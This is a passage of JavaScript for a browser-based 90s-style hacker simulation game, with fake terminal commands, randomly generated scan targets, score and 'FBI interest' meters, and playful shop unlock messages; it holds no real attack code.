(() => {
  const outputEl = document.getElementById('output');
  const inputEl = document.getElementById('cmd-input');
  // legacy hackerFill may be absent now; keep reference if present
  const hackerFill = document.getElementById('hacker-fill');
  const fbiFill = document.getElementById('fbi-fill');
  const scoreBig = document.getElementById('score-big');
  const scoreMult = document.getElementById('score-mult');
  const scoreCurrent = null; // removed "Current Hack" display per user request
  const fbiValue = document.getElementById('fbi-value');
  const minigameEl = document.getElementById('minigame');

  const state = {
    hackerScore: 0,
    fbiInterest: 0
  };

  // ensure persistent game state bag exists and multiplier defaults to 1 
  window._game = window._game || {};
  window._game.lastMultiplier = window._game.lastMultiplier || 1;
  // purchases and upgrade flags
  window._game.purchases = window._game.purchases || [];
  window._game.upgrades = window._game.upgrades || {};
  // effect multipliers with sensible defaults
  window._game.fbiDecayMultiplier = window._game.fbiDecayMultiplier || 1;
  // bandwidth now uses `bandwidthLevel` (seconds reduced per level)

  // track the highest observed base hacker score to prevent accidental decreases
  let lastHackerScore = 0;

  // simple command history for ArrowUp/ArrowDown navigation
  let cmdHistory = [];
  let historyIndex = -1; // points inside cmdHistory or equals cmdHistory.length for 'new' entry

  // helper: pick a random username for remote prompt
  function pickRandomUser() {
    const names = ['neo','root','admin','sys','operator','guest','haxor','zero','morpheus','trinity','pilot','delta','sigma','echo','pixel'];
    return names[Math.floor(Math.random()*names.length)];
  }

  // show a small red micro-toast that emits from the top of the FBI meter
  function showFbiToast(text, opts = {}) {
    try {
      const el = document.createElement('div');
      el.className = 'micro-toast danger fbi-origin';
      el.textContent = text;
      document.body.appendChild(el);

      // position at top of the fbi-fill element
      const fill = document.getElementById('fbi-fill');
      if (fill) {
        const r = fill.getBoundingClientRect();
        // parse percent from inline style if present, otherwise compute from current height
        let percent = 0;
        const hs = (fill.style && fill.style.height) ? fill.style.height : '';
        const m = hs.match(/(\d+)%/);
        if (m) percent = parseInt(m[1],10) / 100;
        // fallback: read computed height ratio
        if (!percent) {
          try {
            const comp = window.getComputedStyle(fill);
            const h = parseFloat(comp.height) || r.height;
            // if element is full height we can approximate percent by its current pixel height relative to its container
            const parent = fill.parentElement;
            if (parent) {
              const pr = parent.getBoundingClientRect();
              percent = Math.max(0, Math.min(1, (r.height / pr.height)));
            }
          } catch(e){ percent = 0; }
        }
        // compute visible top of the fill (bottom - visibleHeight)
        const visibleTopY = r.bottom - (r.height * percent);
        const centerX = r.left + r.width / 2;
        el.style.position = 'fixed';
        el.style.left = (centerX) + 'px';
        el.style.top = (visibleTopY - 6) + 'px';
        el.style.transform = 'translate(-50%, -50%)';
      }

      const dur = opts.duration || 1100;
      const dx = (Math.random() - 0.5) * 100;
      const dy = -(120 + Math.random() * 80);
      el.style.setProperty('--micro-dx', dx + 'px');
      el.style.setProperty('--micro-dy', dy + 'px');
      el.style.setProperty('--micro-dur', dur + 'ms');
      el.classList.add('animate');
      setTimeout(()=>{ try{ if(el && el.parentNode) el.parentNode.removeChild(el); }catch(e){} }, dur + 420);
    } catch(e){}
  }

  // Compact rank list tailored to 90s cyber-hacker vibe.
  // New scheme: 0-99 => 'Some Nobody', 100-999 => 'Script Kiddie',
  // then one rank per 10,000 points from 1,000..99,999. Final rank at 100,000.
  const RANK_NAMES = [
    // placeholders for lower indexes, mapping will be handled in compute section
    'Some Nobody',
    'Script Kiddie',
    // progressive ranks for every 10k step starting at 1,000
    'Dial-up Dabbler',
    'Packet Pusher',
    'Proxy Pixie',
    'Null Byte Ninja',
    'Root Rascal',
    'Shell Slinger',
    'Kernel King',
    'Shadow Scripter',
    'Neon Netrunner'
  ];

  // helper: current prompt string depending on connection
  function getPrompt() {
    if (connection && connection.user && connection.domain) {
      return `${connection.user}@${connection.domain}$ `;
    }
    return 'guest@l33t:~$ ';
  }

  function appendLine(text, className) {
    // Always append lines to the terminal output. Toasts are strictly for HACKER SCORE notifications.
    const div = document.createElement('div');
    div.className = 'line' + (className ? ' ' + className : '');
    div.textContent = text;
    outputEl.appendChild(div);
    outputEl.scrollTop = outputEl.scrollHeight;
  }

  // small utility: sleep for ms milliseconds
  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

  // reusable typewriter line helper (used by scan, find, etc.)
  function typewriterLine(text, className, totalMs = 333){
    return new Promise((resolve) => {
      try {
        const div = document.createElement('div');
        div.className = 'line' + (className ? ' ' + className : '');
        outputEl.appendChild(div);
        outputEl.scrollTop = outputEl.scrollHeight;
        const delay = Math.max(6, Math.floor(totalMs / Math.max(1, text.length)));
        let i = 0;
        const t = setInterval(() => {
          i++;
          div.textContent = text.slice(0, i);
          outputEl.scrollTop = outputEl.scrollHeight;
          if (i >= text.length) {
            clearInterval(t);
            resolve();
          }
        }, delay);
      } catch(e) { resolve(); }
    });
  }

  // show a transient floating toast above the input bar (rises upward and fades)
  function showToast(text, opts = {}) {
    try {
      // If this is a HACKER SCORE message, delegate to showScoreToast so text is embedded inside the bubble.
      const textStr = String(text || '');
      if (textStr.toUpperCase().includes('HACKER SCORE')) {
        try { showScoreToast(text, opts); } catch(e){}
        return;
      }
      const t = document.createElement('div');
      const explicitType = (opts && opts.type) ? opts.type : null;
      const type = explicitType || 'success';
      t.className = 'floating-toast' + (type === 'danger' ? ' danger' : '');
      t.textContent = text;
      // attach to body
      const holder = document.body;
      holder.appendChild(t);
      // Toasts are only used for HACKER SCORE increases. Position in the center of the shop/modal area so it visually matches the shop modal.
      try {
        if (String(text).toUpperCase().includes('HACKER SCORE')) {
          // place score toasts above the left-panel score display
          const leftPanel = document.getElementById('left-panel');
          const scoreEl = document.getElementById('score-big');
          // 1 inch in CSS pixels ~96px
          const inchPx = 96;
          if (leftPanel && scoreEl) {
            const lp = leftPanel.getBoundingClientRect();
            const rs = scoreEl.getBoundingClientRect();
            const centerX = Math.round(lp.left + lp.width / 2);
            const top = Math.round(rs.top - inchPx);
            t.style.position = 'fixed';
            t.style.left = centerX + 'px';
            t.style.top = top + 'px';
            t.style.transform = 'translate(-50%, -50%)';
            t.style.whiteSpace = 'nowrap';
          } else {
            // fallback to terminal center
            const term = document.getElementById('terminal');
            const anchor = document.getElementById('shop-modal') || term;
            if (anchor) {
              const r = anchor.getBoundingClientRect();
              const left = Math.round(r.left + r.width / 2);
              const top = Math.round(r.top + r.height / 2);
              t.style.position = 'fixed';
              t.style.left = left + 'px';
              t.style.top = top + 'px';
              t.style.transform = 'translate(-50%, -50%)';
              t.style.whiteSpace = 'nowrap';
            }
          }
        }
      } catch (e) {}
  // force initial style then animate (default: fade-up) for non-score toasts.
      // Danger toasts should last a bit longer so the red penalty is more noticeable.
      const defaultNonScoreDur = opts.duration || (opts.type === 'danger' ? 8200 : 5500);
      if (!String(text).toUpperCase().includes('HACKER SCORE')) {
        t.animate([
          { transform: 'translateY(0px)', opacity: 1 },
          { transform: 'translateY(-60px)', opacity: 0 }
        ], { duration: defaultNonScoreDur, easing: 'cubic-bezier(.2,.9,.3,1)' });
        setTimeout(() => { try { if (t && t.parentNode) t.parentNode.removeChild(t); } catch(e){} }, defaultNonScoreDur);
      } else {
        // score toasts rely on CSS (.rise-wiggle) and are removed after duration
        t.classList.add('rise-wiggle');
        const scoreDur = opts.duration || (opts.type === 'danger' ? 9200 : 7600);
        t.style.setProperty('--toast-dur', scoreDur + 'ms');
        setTimeout(() => { try { if (t && t.parentNode) t.parentNode.removeChild(t); } catch(e){} }, scoreDur + 80);
      }
    } catch (e) {}
  }

  // Specialized score toast: sleek, non-fading, drifts horizontally off-screen and disappears.
  function showScoreToast(text, opts = {}) {
    try {
      const t = document.createElement('div');
      const textStr = String(text || '');
      // infer sign for colored styling unless explicitly provided
      const explicitType = (opts && opts.type) ? opts.type : null;
      let type = explicitType || 'success';
      if (!explicitType) {
        const m = textStr.match(/([+-]?\d+)\s*HACKER SCORE/i);
        if (m && m[1]) type = String(m[1]).trim().startsWith('-') ? 'danger' : 'success';
        else if (/\-\d+/.test(textStr)) type = 'danger';
        else type = 'success';
      }
  t.className = 'floating-toast score-toast' + (type === 'danger' ? ' danger' : '');
  // use a rise-only animation (no wiggle) so the score bubble drifts upward cleanly
  t.classList.add('rise-only');
      // compute a concise display version so the toast fits on the page
      const full = String(text || '');
      function shortify(s) {
        try {
          const m = s.match(/([+-]?\d+)\s*HACKER SCORE/i);
          if (m) {
            let n = m[1]; if (!/^\+|\-/.test(n)) n = (n[0] === '-') ? n : '+' + n;
            return `${n} HACKER SCORE`;
          }
          const m2 = s.match(/\+(\d+)/);
          if (m2) return `+${m2[1]} HACKER SCORE`;
          if (/you can now afford/i.test(s)) {
            // try to extract upgrade name (after colon) or last quoted phrase
            const after = s.split(':').pop().trim();
            const q = after.match(/"([^"]+)"/);
            const name = q ? q[1] : after;
            return name.length > 28 ? name.slice(0,24) + '...' : name;
          }
          // fallback: trim to 28 chars
          return s.length > 28 ? s.slice(0,25) + '...' : s;
        } catch (e) { return s.length > 28 ? s.slice(0,25) + '...' : s; }
      }
      const disp = shortify(full);
    // embed the text inside the bubble (no inner wiggle)
  t.innerHTML = `<span class="score-toast-inner">${disp}</span>`;
      t.title = full;
      document.body.appendChild(t);
      // anchor over left panel score if available
      const leftPanel = document.getElementById('left-panel');
      const scoreEl = document.getElementById('score-big');
      const inchPx = 96;
      if (leftPanel && scoreEl) {
        const lp = leftPanel.getBoundingClientRect();
        const rs = scoreEl.getBoundingClientRect();
        const centerX = Math.round(lp.left + lp.width / 2);
  // position toast directly above the score text (small vertical gap)
  const top = Math.round(rs.top - 18); // ~18px above the top of the score element
        t.style.position = 'fixed';
        t.style.left = centerX + 'px';
        t.style.top = top + 'px';
        t.style.transform = 'translate(-50%, -50%)';
        // keep score toasts horizontally centered within the left panel
        t.style.left = (lp.left + lp.width / 2) + 'px';
        // force no horizontal drift for clean centered appearance
        t.style.setProperty('--score-dx', '0px');
      }
      // Use CSS animation for rise + wiggle + fade. Allow caller to specify duration.
      // make the default a bit slower so the toast rises more leisurely
      const dur = opts.duration || 7600;
      // expose duration to CSS via inline style var so keyframes can read it via animation-duration (ms)
      t.style.setProperty('--toast-dur', dur + 'ms');
      // Remove element after duration + small buffer
      setTimeout(() => { try { if (t && t.parentNode) t.parentNode.removeChild(t); } catch(e){} }, dur + 60);
    } catch (e) {}
  }

  function renderMeters() {
    // Hacker score is unbounded (display full value). Meter fill caps at 100% visually.
    const hs = state.hackerScore;
    const fi = Math.max(0, Math.min(100, state.fbiInterest));
    const fillHs = Math.max(0, Math.min(100, hs));
    if (hackerFill) hackerFill.style.height = fillHs + '%';
    if (fbiFill) fbiFill.style.height = fi + '%';
    // show live total = base score + current hack accrual
    const cur = hackState && typeof hackState.currentPoints === 'number' ? hackState.currentPoints : 0;
    if (scoreBig) scoreBig.textContent = Math.round(hs);
    // multiplier and current hack points come from hackState when active
  const mult = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game && window._game.lastMultiplier) || 1);
    if (scoreMult) {
  // clarify multiplier applies to downloads, not to minigame points
  const displayMult = Math.min(mult, 1000); // cap visible multiplier at x1000
  scoreMult.textContent = `DOWNLOAD MULTIPLIER x${displayMult}`;
      try {
        // visual sizing uses a capped effective value for readability, but animation speed uses the real multiplier
        const visualMult = Math.min(mult, 1000);
        // font size grows with multiplier but caps at a reasonable max
        const fontSize = Math.min(84, 14 + (visualMult * 0.2));
        scoreMult.style.fontSize = fontSize + 'px';
        // subtle scale using logarithm for smoother growth
        const scale = 1 + Math.min(8, Math.log2(visualMult + 1)) * 0.08;
        // animation speeds scale with the real multiplier for wobble pacing
        const pct = Math.min(1, Math.log2(mult + 1) / Math.log2(1000 + 1));
        const baseShake = Math.max(60, 900 - Math.floor(pct * 820));
        const baseRotate = Math.max(220, 1400 - Math.floor(pct * 1180));
        scoreMult.style.transform = `scale(${scale})`;
        scoreMult.style.transition = 'transform 300ms cubic-bezier(.2,.9,.3,1)';
        scoreMult.style.animation = `mult-shake ${baseShake}ms ease-in-out infinite, mult-rotate ${baseRotate}ms linear infinite`;
      } catch (e) { }
    }
    if (scoreCurrent) scoreCurrent.textContent = `Current hack: ${Math.round(cur)} pts`;
    // compute rank label per user spec:
    // 0..99 => Some Nobody
    // 100..999 => Script Kiddie
    // every 10000 points from 1,000 yields a new cyber-90s inspired title
    // final rank at 100,000 => SUPER L337 H4CKER!!!
    const points = Math.max(0, Math.floor(hs + cur));
    let rankLabel = 'Some Nobody';
    if (points < 100) {
      rankLabel = 'Some Nobody';
    } else if (points < 1000) {
      rankLabel = 'Script Kiddie';
    } else if (points >= 100000) {
      rankLabel = 'SUPER L337 H4CKER!!!';
    } else {
      // titles for each 10k tier starting at 1,000
      const tierTitles = [
        'Dial-up Dabbler',      // 1,000 - 10,999
        'Packet Pusher',        // 11,000 - 20,999
        'Proxy Pixie',          // 21,000 - 30,999
        'Null Byte Ninja',      // 31,000 - 40,999
        'Root Rascal',          // 41,000 - 50,999
        'Shell Slinger',        // 51,000 - 60,999
        'Kernel King',          // 61,000 - 70,999
        'Shadow Scripter',      // 71,000 - 80,999
        'Neon Netrunner'        // 81,000 - 99,999
      ];
      const tier = Math.floor((points - 1000) / 10000);
      rankLabel = tierTitles[Math.max(0, Math.min(tierTitles.length - 1, tier))] || `Rank ${Math.floor(points / 1000)}`;
    }
  const rankEl = document.getElementById('player-rank');
    if (rankEl) rankEl.textContent = rankLabel;
    // Rank glow/wobble intensity: non-decreasing so it only grows when player ranks up
    try {
      window._game = window._game || {};
      const prevIntensity = window._game.rankIntensity || 0;
      // map points to an intensity 0..1 where 0 is lowest and 1 is ultimate
      let intensity = 0;
      if (points >= 100000) intensity = 1;
      else if (points >= 1000) {
        // scale from 0.05 at 1k up to 0.95 at 99,999
        intensity = Math.min(0.95, Math.max(0.05, (points - 1000) / 99000));
      } else if (points >= 100) {
        intensity = 0.02;
      } else {
        intensity = 0;
      }
      // persist non-decreasing
      if (intensity > prevIntensity) window._game.rankIntensity = intensity; else intensity = prevIntensity;
      // apply visual scaling: glow (text-shadow), scale and animation durations
      const glowStrength = 6 + Math.floor(intensity * 40); // px blur
      const glowColor = `rgba(160,255,200,${0.12 + intensity * 0.6})`;
      const scale = 1 + (intensity * 0.18);
      const shakeMs = Math.max(220, Math.floor(900 - intensity * 760));
      const rotateMs = Math.max(400, Math.floor(1400 - intensity * 1100));
      rankEl.style.textShadow = `0 0 ${glowStrength}px ${glowColor}, 0 2px ${glowColor}`;
      rankEl.style.transform = `scale(${scale})`;
      rankEl.style.animation = `rank-shake ${shakeMs}ms ease-in-out infinite, rank-rotate ${rotateMs}ms linear infinite`;
    } catch(e) { console.debug('rank visual err', e); }
    if (fbiValue) fbiValue.textContent = Math.round(fi);
    // check for ultimate unlock prompt
    maybeShowUltimate();
    // check for shop unlock hints (show helpful popups when player reaches score milestones)
    maybeShowUnlockHints();
    // hide the startup scan banner once player reaches 100 HACKER SCORE
    try {
      const b = document.getElementById('banner-cta');
      if (b && state.hackerScore >= 100) {
        // if this was the startup hint, hide it
        if (b.textContent && b.textContent.toString().trim() === 'Try scanning!') {
          hideUnlockBanner();
        }
      }
    } catch(e) {}
  }

  // one-time hints when player reaches score thresholds for shop items
  let _hackUnlockHintShown = false;
  let _connectUnlockHintShown = false;
  function maybeShowUnlockHints() {
    try {
      // find the upgrade definitions
      const hackDef = UPGRADE_LIST.find(u => u.id === 'unlock_hack');
      const connDef = UPGRADE_LIST.find(u => u.id === 'unlock_connect');
      if (!hackDef) return;
        // show hack hint when player has at least the cost for unlock_hack
        if (!_hackUnlockHintShown && state.hackerScore >= hackDef.cost) {
          _hackUnlockHintShown = true;
          // brief modal encouraging purchase in l337 90s voice
          showModal('Respect the code, kid.',
            'Congrats — you made it this far, script kiddie.' +
            '\n\n' +
            "Scanning for vulnz ain\'t special. Anyone can run a scanner and puke results to a console.\n\n" +
            `If you want to be a real hacker, you gotta do more than find stuff on the Net. Buy the "${hackDef.name}" (${hackDef.cost} pts) in the Shop to unlock the 'hack' command.` +
            '\n\n' +
            "After you buy it, use: hack <domain_name> to assault the machines you\'ve discovered.\n\n" +
            "Lots of people can run scans. The BIG PLAYERS turn that noise into signal and cash. Get better, kid."
          );
      // show top banner prompting purchase (green)
      try { showUnlockBanner('Purchase the hack tool from the shop!'); } catch(e){}
      }
      // show connect hint when player can afford connect (but only after hack hint or if they already have hack)
      if (connDef && !_connectUnlockHintShown && state.hackerScore >= connDef.cost) {
        // only show if they don't already own connect
        const owns = (window._game && window._game.purchases && window._game.purchases.find(p => p.id === 'unlock_connect')) ? true : false;
        if (!owns) {
          _connectUnlockHintShown = true;
            showModal('You made it. Now go earn it.',
              "Nice — you made it this far. Now you're HACKING. But don\'t get cozy: it only gets harder from here.\n\n" +
              "Hacking boxes won\'t pay the electric bill. If you\'re serious about this life, you gotta turn access into currency.\n\n" +
              `Buy the "${connDef.name}" (${connDef.cost} pts) in the Shop to unlock the 'connect' command.\n\n` +
              "Once you own it, from the main terminal run: connect <domain> to attach to any machine you\'ve hacked. Once connected, you can download files for HUGE hacker cred. Sick!\n\n" +
              "Bigger files mean bigger points — pretty easy, right? But warning: while you\'re connected the FBI will be hot on your trail, getting more interested every second.\n\n" +
              "Also: hauling files draws major attention. Download wisely, N00b — don\'t get caught."
            );
          try { showUnlockBanner('Purchase the connect tool form the shop!'); } catch(e){}
        }
      }
    } catch (e) {}
  }

  // if player reaches ultimate hacker score threshold, prompt special instruction once
  let _ultimatePromptShown = false;
  function maybeShowUltimate() {
    if (_ultimatePromptShown) return;
    if (state.hackerScore >= 100000) {
      _ultimatePromptShown = true;
      // if a hack minigame is active, cancel it so the player can immediately run the FBI scan
      try { if (hackState) endHack(false); } catch (e) {}
      // non-blocking modal
  showModal('ULTIMATE HACKER UNLOCKED', `YOU ARE NOW THE ULTIMATE HACKER.\n\nYour skills are fearsome and unreal — servers whisper when you touch the net. Downloads used to thrill you; now they're training wheels. You hack for sport. The bigger the hit, the harder you grin. Money's for toddlers: it's time to hunt the BIG FISH.\n\nIf you really wanna prove you're untouchable, break ranks and go loud: run the command "scan FBI" from the main terminal to reveal your target. After that... you know what to do.\n\nStay lethal. Stay legendary. -- SUPER L337`);
      // show banner CTA above the terminal encouraging the player to scan the FBI
      try {
        const b = document.getElementById('banner-cta');
        if (b) {
          b.textContent = 'HACK THE FBI!!! Run the command " scan fbi " from the main terminal window.';
          b.classList.remove('unlock'); b.classList.add('fbi');
          b.style.display = 'block';
        }
      } catch (e) {}
    }
  }

  // show/hide small green unlock banner at the top of the terminal
  function showUnlockBanner(text) {
    try {
      const b = document.getElementById('banner-cta');
      if (!b) return;
      b.textContent = text;
      b.classList.remove('fbi'); b.classList.add('unlock');
      b.style.display = 'block';
      b.setAttribute('aria-hidden','false');
    } catch(e){}
  }

  function hideUnlockBanner() {
    try {
      const b = document.getElementById('banner-cta');
      if (!b) return;
      b.style.display = 'none';
      b.classList.remove('unlock'); b.classList.remove('fbi');
      b.setAttribute('aria-hidden','true');
    } catch(e){}
  }

  // Right-side FBI delta indicator removed. Use showFbiToast() which emits from the FBI meter fill instead.

  function handleCommand(raw) {
    window._game = window._game || {};
    if (window._game._gameOver) {
      appendLine('Game over. Refresh the page to play again.', 'muted');
      return;
    }
  const cmd = (raw || '').trim();
  // prefer using the visible prompt span if present
  const promptSpan = document.querySelector('.prompt');
  const promptText = promptSpan ? (promptSpan.textContent + ' ') : getPrompt();
  appendLine(promptText + cmd, 'muted');
    // visual feedback: small shake + glow
    // apply text-level shake to output and input-line
    const out = document.querySelector('.output');
    const inLine = document.querySelector('.input-line');
    if (out || inLine) {
      out && out.classList.remove('text-shake');
      inLine && inLine.classList.remove('text-shake');
      // force reflow
      void (out && out.offsetWidth);
      void (inLine && inLine.offsetWidth);
      out && out.classList.add('text-shake');
      inLine && inLine.classList.add('text-shake');
      setTimeout(() => out && out.classList.remove('text-shake'), 350);
      setTimeout(() => inLine && inLine.classList.remove('text-shake'), 350);
    }
    if (!cmd) return;

    const parts = cmd.split(/\s+/);
    const name = parts[0].toLowerCase();
    const args = parts.slice(1);

    // If connected to a remote machine, only allow remote commands
    if (connection) {
      const remoteAllowed = ['exit','help','ls','cat','download'];
      if (!remoteAllowed.includes(name)) {
  appendLine('The specified command does not exist.', 'muted');
        return;
      }
    }

  if (name === 'help') {
      if (connection) {
        const entries = [
          {cmd: 'cat <file>', desc: 'display the contents of a remote file'},
          {cmd: 'download <file>', desc: 'download a file from the remote host (adds FBI interest)'},
          {cmd: 'exit', desc: 'disconnect and return to local terminal'},
          {cmd: 'ls', desc: 'list files on the remote filesystem (use download <file>)'},
          {cmd: 'help', desc: 'show this help text for remote machine'}
        ];
        entries.sort((a,b) => a.cmd.localeCompare(b.cmd));
        appendLine('Available commands on remote machine:', 'muted');
        entries.forEach(e => appendLine(`  ${e.cmd} - ${e.desc}`, 'muted'));
      } else {
        // build help entries dynamically so some commands can be gated behind purchases
        const entries = [
          {cmd: 'help', desc: 'show this help text'},
          {cmd: 'list-downloads', desc: 'show files you have downloaded'},
          {cmd: 'list-owned', desc: 'show hacked machines you own'},
          {cmd: 'list-scan', desc: 'show all previously discovered scan results'},
          {cmd: 'scan', desc: 'discover random vulnerable systems'}
        ];
        // 'cat' is only available when connected to a remote machine (remote cat)
        // only show 'connect' if the player has purchased the unlock_connect upgrade
        try {
          const hasConnect = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_connect')) ? true : false;
          if (hasConnect) entries.splice(1, 0, {cmd: 'connect <ip|hostname>', desc: 'connect to a hacked machine you own'});
        } catch(e) {}
        // if the player has purchased the hack unlock, show hack
        try {
          const hasHack = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_hack')) ? true : false;
          if (hasHack) entries.splice(3, 0, {cmd: 'hack <ip|hostname>', desc: 'attempt to hack a scanned target'});
        } catch(e) {}
        // show touch-grass if purchased
        try {
          const hasTouch = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='touch_grass')) ? true : false;
          if (hasTouch) entries.push({cmd: 'touch-grass', desc: 'Go outside, reduce multiplier by 10 and FBI interest by 20 (2s).'});
        } catch(e) {}
        entries.sort((a,b) => a.cmd.localeCompare(b.cmd));
      appendLine('Available commands:', 'muted');
        entries.forEach(e => appendLine(`  ${e.cmd} - ${e.desc}`, 'muted'));
    
      }
    } else if (name === 'scan') {
      // special-case: scanning the FBI if the player was prompted/unlocked
      if (args.length > 0 && args[0].toLowerCase() === 'fbi') {
        // ensure player has reached the ultimate threshold (safety check)
        if (state.hackerScore < 100000) {
          appendLine('Scan target not found.', 'muted');
          return;
        }
        // produce one FBI entry with random ip and host fbi.gov
        const ip = Array.from({length:4}, ()=> Math.floor(Math.random()*254)+1).join('.');
        const host = 'fbi.gov';
        const cat = ' The Federal Bureau of Investigation ';
        const entry = `${ip}  ${host}  ${cat}`;
        appendLine(entry);
        window._game = window._game || {};
        window._game.scanHistory = window._game.scanHistory || [];
        window._game.scanHistory.push(entry);
  // scanning the FBI will increase FBI interest by 5 points and award hacker score
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
  try { showFbiToast('+5', { duration: 1100 }); } catch(e){}
  // award small bounty for discovering a target; apply current multiplier
  const curMult = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game && window._game.lastMultiplier) || 1);
  const reward = Math.floor(10 * curMult);
  state.hackerScore += reward;
  showScoreToast(`+${reward} HACKER SCORE for discovering ${host}`);
        renderMeters();
        return;
      }
  // choose number of hosts between 2 and 10, biased toward fewer hosts
  const count = 2 + Math.floor(Math.pow(Math.random(), 1.6) * 9); // 2..10, skewed low
      const cats = [
        'NASA','Military','Government','Grandma','Personal','School','Hospital','Small Business','ISP','Large Business',
        'Laptop','Gaming Desktop','Research Lab','University','Data Center','Cloud Provider','Retail POS','ATM','Banking',
        'Smart TV','Router','IoT Thermostat','Municipal','Power Grid','Transit System','Media Outlet','Pharmacy','Clinic',
        'Drone','Satellite Groundstation','Factory','Police','FireDept','Library','Archive','Supermarket','Hotel','Museum'
      ];

      function randIp(){
        return Array.from({length:4}, ()=> Math.floor(Math.random()*254)+1).join('.');
      }

      // more realistic hostname generator with varied patterns
      function randWord(){
        const words = ['alpha','omega','delta','nova','cypher','quantum','atlas','zephyr','titan','hera','argos','neon','pulse','vector','raven','onyx','jade','volt','sable','lumen','spectre','orchid','mercury','apollo','merit'];
        return words[Math.floor(Math.random()*words.length)];
      }

      function randNum(digits=2){
        return Math.floor(Math.random()*(10**digits));
      }

      function randUser(){
        const names = ['alice','bob','carol','dave','eve','mallory','trent','peggy','victor','oscar'];
        return names[Math.floor(Math.random()*names.length)];
      }

      function randDomain(){
        const domains = ['example.com','corp.net','company.org','service.io','gov.local','university.edu','clinic.health','shop.co','network.lan'];
        return domains[Math.floor(Math.random()*domains.length)];
      }

      function randSubdomain(){
        const subs = ['mail','db','vpn','web','api','proxy','backup','dev','test'];
        return `${subs[Math.floor(Math.random()*subs.length)]}.${randDomain()}`;
      }

      function randHostname(){
        const patterns = [
          () => `${randWord()}.${randDomain()}`,
          () => `${randWord()}-${randNum(2)}.${randDomain()}`,
          () => `srv${randNum(2)}.${randDomain()}`,
          () => `${randUser()}-laptop.${randDomain()}`,
          () => `${randWord()}${randNum(3)}.${randDomain()}`,
          () => `${randSubdomain()}`
        ];
        const pick = patterns[Math.floor(Math.random()*patterns.length)];
        return pick();
      }

      // ensure scan history exists
      window._game = window._game || {};
      window._game.scanHistory = window._game.scanHistory || [];

      // build sets of used IPs and hosts from history so new ones are unique
      const usedIps = new Set();
      const usedHosts = new Set();
      (window._game.scanHistory || []).forEach(e => {
        const parts = e.split('  ');
        if (parts[0]) usedIps.add(parts[0]);
        if (parts[1]) usedHosts.add(parts[1]);
      });

      // prepare entries (do not append immediately)
      const entriesToShow = [];
      for(let i=0;i<count;i++){
        // generate unique ip
        let ip = randIp();
        let tries = 0;
        while(usedIps.has(ip) && tries < 200){ ip = randIp(); tries++; }
        if (usedIps.has(ip)) {
          ip = ip + '-' + Date.now()%1000 + i;
        }

        // generate unique host
        let host = randHostname();
        tries = 0;
        while(usedHosts.has(host) && tries < 200){ host = randHostname(); tries++; }
        if (usedHosts.has(host)) {
          host = host.replace(/\.[^\.]+$/, '') + '-' + Math.floor(Math.random()*900+100) + '.' + randDomain();
        }

        const cat = cats[Math.floor(Math.random()*cats.length)];
        const entry = `${ip}  ${host}  ${cat}`;
        entriesToShow.push({ ip, host, cat, entry });
        // reserve these so future generations avoid collision
        usedIps.add(ip);
        usedHosts.add(host);
      }

      // helper: sleep
      function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

      // helper: typewriter append that takes ~1s total per host
      function typewriterLine(text, className){
        return new Promise((resolve) => {
          try {
            const div = document.createElement('div');
            div.className = 'line' + (className ? ' ' + className : '');
            outputEl.appendChild(div);
            outputEl.scrollTop = outputEl.scrollHeight;
            const totalMs = 333; // aim for ~0.33s per host (three times faster)
            const delay = Math.max(6, Math.floor(totalMs / Math.max(1, text.length)));
            let i = 0;
            const t = setInterval(() => {
              i++;
              div.textContent = text.slice(0, i);
              outputEl.scrollTop = outputEl.scrollHeight;
              if (i >= text.length) {
                clearInterval(t);
                resolve();
              }
            }, delay);
          } catch(e) { resolve(); }
        });
      }

      // reveal entries sequentially, 1 second-ish per host with typing effect
      (async () => {
        for (const obj of entriesToShow) {
            await typewriterLine(obj.entry);
          // record in history and update meters
          window._game.scanHistory.push(obj.entry);
          // each discovered host raises FBI interest by 5 points
          state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
          try { showFbiToast('+5', { duration: 1100 }); } catch(e){}
            // award hacker score per discovered host and apply multiplier
            const curM = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game && window._game.lastMultiplier) || 1);
            const rew = Math.floor(10 * curM);
            state.hackerScore += rew;
            showScoreToast(`+${rew} HACKER SCORE for discovering ${obj.host}`);
          renderMeters();
          // small pause to allow the faster typewriter effect to settle
          await sleep(20);
        }
      })();
      } else if (name === 'hack') {
      // ensure hack is unlocked via shop
      const hasHack = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_hack')) ? true : false;
      if (!hasHack) {
  appendLine('The specified command does not exist.', 'muted');
        return;
      }
      if (args.length === 0) {
  appendLine('Usage: hack <ip|hostname>', 'muted');
      } else {
        startHack(args[0]);
      }
      return;
    } else if (name === 'touch-grass' || name === 'touch_grass') {
      // gated: must purchase touch-grass from shop
      const hasTouch = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='touch_grass')) ? true : false;
      if (!hasTouch) { appendLine('Unknown command: ' + name, 'muted'); appendLine("Type 'help' to see available commands.", 'muted'); return; }
      // Block input for 2 seconds and show a progress bar line
      appendLine('You step outside...','muted');
      const totalTicks = 2; // 2 seconds
      const progressLineIndex = (() => { appendLine(`[${' '.repeat(30)}] 0%  touch-grass`); return outputEl.children.length - 1; })();
      let secondsElapsed = 0;
      // disable input by blurring and setting a flag on _game
      try { window._game.modalOpen = true; inputEl.blur(); } catch(e){}
      const tick = setInterval(() => {
        secondsElapsed++;
        const progress = Math.min(1, secondsElapsed / totalTicks);
        const blocks = Math.floor(progress * 30);
        const bar = '[' + '#'.repeat(blocks) + ' '.repeat(30-blocks) + `] ${Math.floor(progress*100)}%  touch-grass`;
        const lineEl = outputEl.children[progressLineIndex];
        if (lineEl) lineEl.textContent = bar;
        if (secondsElapsed >= totalTicks) {
          clearInterval(tick);
          // apply effects: reduce multiplier by 10 (but allow it to go to min 1)
          try { window._game = window._game || {}; window._game.lastMultiplier = Math.max(1, (window._game.lastMultiplier || 1) - 10); } catch(e){}
          // reduce FBI interest by 20 (stronger effect) and show a green micro-toast at the FBI meter
          state.fbiInterest = Math.max(0, (state.fbiInterest || 0) - 20);
